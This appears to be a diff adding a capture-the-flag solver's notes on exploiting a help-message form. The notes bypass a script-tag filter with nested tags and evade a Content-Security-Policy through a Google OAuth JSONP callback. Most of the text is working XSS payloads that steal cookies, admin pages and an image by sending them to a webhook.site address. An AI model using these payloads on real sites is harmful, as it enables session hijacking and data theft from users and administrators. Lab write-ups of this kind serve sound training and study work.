@@ -1,0 +1,116 @@
+Content-Security-Policy: default-src 'self'   *.google.com *.gstatic.com; script-src 'self'  *.google.com *.gstatic.com; style-src 'self' 'unsafe-inline'; object-src 'none'; img-src *
+
+Should be XSS
+	Not Viewed => Viewed
+
+name: 	<script>a</script>
+msg: 	<script>b</script>
+
+<p>Viewed</p>
+<p>&amp;lt;script&amp;gt;a&amp;lt;/script&amp;gt;</p>
+<p>&lt;script&gt;b&lt;/script&gt;</p>
+
+js/index.js
+	axios.post('/api/help/add', {
+      name: _.escape(name.value),
+      msg: _.escape(msg.value),
+      captch: _.escape(captch.value)
+    })
+
+Client-side Escape
+
+{"name":"&lt;script&gt;alert(1)&lt;script&gt;","msg":"&lt;script&gt;alert(1)&lt;/script&gt;"}
+=>
+{"name":"<script>alert(1)</script>","msg":"<script>alert(1)</script>"}
+
+<p>Not Viewed</p>
+<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>
+<p>alert(1)</p>
+
+
+<script> tag disappear
+=> <sc<script>ript>
+
+{"name":"&lt;script&gt;alert(1)&lt;script&gt;","msg":"&lt;script&gt;alert(1)&lt;/script&gt;"}
+=>
+{"name":"<sc<script>ript>alert(1)</sc</script>ript>","msg":"<sc<script>ript>alert(1)</sc</script>ript>"}
+
+<p>Not Viewed</p>
+<p>&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</p>
+<p><script>alert(1)</script></p>
+
+## Got Error
+Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'  *.google.com *.gstatic.com". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.
+
+
+
+
+CSP Bypass via JSONP
+	https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#jsonp
+
+## Use this for msg
+<sc<script>ript src="https://accounts.google.com/o/oauth2/revoke?callback=alert(31337)"></sc</script>ript>
+
+
+{"name":"a","msg":"<sc<script>ript src=\"https://accounts.google.com/o/oauth2/revoke?callback=alert(31337)\"></sc</script>ript>"}
+	XSS worked !!
+
+## Fetch Cookie
+	Payload: window.location=encodeURI('https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?c='.concat(btoa(document.cookie)));
+	=>
+	{"name":"a","msg":"<sc<script>ript src=\"https://accounts.google.com/o/oauth2/revoke?callback=window.location=encodeURI('https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?c='.concat(btoa(document.cookie)));\"></sc</script>ript>"}
+
+Did not get cookie, but we found referrer interesting
+	http://nginx/admin/read.html?id=c3ef47fb4f5ffd9862e582eebaa70b67ac01e94db032e6e7d9fd219bd2faa889
+
+## Fetch http://nginx/admin/
+Payload:
+	var xhr=new XMLHttpRequest();
+	xhr.open('GET','http://nginx/admin/',false);
+	xhr.send();
+	window.location=encodeURI('https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?x='.concat(btoa(xhr.responseText)));
+
+	{"name":"a","msg":"<sc<script>ript src=\"https://accounts.google.com/o/oauth2/revoke?callback=var xhr=new XMLHttpRequest();xhr.open('GET','http://nginx/admin/',false);xhr.send();window.location=encodeURI('https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?x='.concat(btoa(xhr.responseText)));\"></sc</script>ript>"}
+
+Get /admin/index.html
+
+## Fetch http://nginx/admin/index.js
+
+	{"name":"a","msg":"<sc<script>ript src=\"https://accounts.google.com/o/oauth2/revoke?callback=var xhr=new XMLHttpRequest();xhr.open('GET','http://nginx/admin/index.js',false);xhr.send();window.location=encodeURI('https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?x='.concat(btoa(xhr.responseText)));\"></sc</script>ript>"}
+
+
+## Fetch http://nginx/admin/list.html
+	{"name":"a","msg":"<sc<script>ript src=\"https://accounts.google.com/o/oauth2/revoke?callback=var xhr=new XMLHttpRequest();xhr.open('GET','http://nginx/admin/list.html',false);xhr.send();window.location=encodeURI('https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?x='.concat(btoa(xhr.responseText)));\"></sc</script>ript>"}
+
+
+## Fetch http://nginx/admin/list.js
+	{"name":"a","msg":"<sc<script>ript src=\"https://accounts.google.com/o/oauth2/revoke?callback=var xhr=new XMLHttpRequest();xhr.open('GET','http://nginx/admin/list.js',false);xhr.send();window.location=encodeURI('https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?x='.concat(btoa(xhr.responseText)));\"></sc</script>ript>"}
+
+## Fetch http://nginx/admin/read.html
+	{"name":"a","msg":"<sc<script>ript src=\"https://accounts.google.com/o/oauth2/revoke?callback=var xhr=new XMLHttpRequest();xhr.open('GET','http://nginx/admin/read.html',false);xhr.send();window.location=encodeURI('https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?x='.concat(btoa(xhr.responseText)));\"></sc</script>ript>"}
+
+## Fetch http://nginx/admin/read.js
+	{"name":"a","msg":"<sc<script>ript src=\"https://accounts.google.com/o/oauth2/revoke?callback=var xhr=new XMLHttpRequest();xhr.open('GET','http://nginx/admin/read.js',false);xhr.send();window.location=encodeURI('https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?x='.concat(btoa(xhr.responseText)));\"></sc</script>ript>"}
+
+## Fetch http://nginx/admin/prize.html
+	{"name":"a","msg":"<sc<script>ript src=\"https://accounts.google.com/o/oauth2/revoke?callback=var xhr=new XMLHttpRequest();xhr.open('GET','http://nginx/admin/prize.html',false);xhr.send();window.location=encodeURI('https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?x='.concat(btoa(xhr.responseText)));\"></sc</script>ript>"}
+
+## Fetch http://nginx/admin/prize.js
+	{"name":"a","msg":"<sc<script>ript src=\"https://accounts.google.com/o/oauth2/revoke?callback=var xhr=new XMLHttpRequest();xhr.open('GET','http://nginx/admin/prize.js',false);xhr.send();window.location=encodeURI('https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?x='.concat(btoa(xhr.responseText)));\"></sc</script>ript>"}
+
+## Fetch /api/admin/pz/ex
+	{"name":"a","msg":"<sc<script>ript src=\"https://accounts.google.com/o/oauth2/revoke?callback=var xhr=new XMLHttpRequest();xhr.open('POST','/api/admin/pz/ex',false);xhr.send();window.location=encodeURI('https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?x='.concat(btoa(xhr.responseText)));\"></sc</script>ript>"}
+
+{
+  "ex": "8 * 8 = ?"
+}
+
+
+... Skip the part of solving math challenge
+
+
+## Fetch image
+	{"name":"a","msg":"<scri<script>pt src=\"https://accounts.google.com/o/oauth2/revoke?callback=var img=new Image;img.crossOrigin='Anonymous';img.src='/admin/img/175193053491407376ff47dc6e834673.png';setTimeout(function(){var c=document.createElement('canvas');c.height=img.naturalHeight;c.width=img.naturalWidth;var ctx=c.getContext('2d');ctx.drawImage(img,0,0,c.width,c.height);window.location=encodeURI('https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/?x='.concat(c.toDataURL()));},3000);\"></scri</script>pt>"}
+
+
+Get base64 image with cyberchef
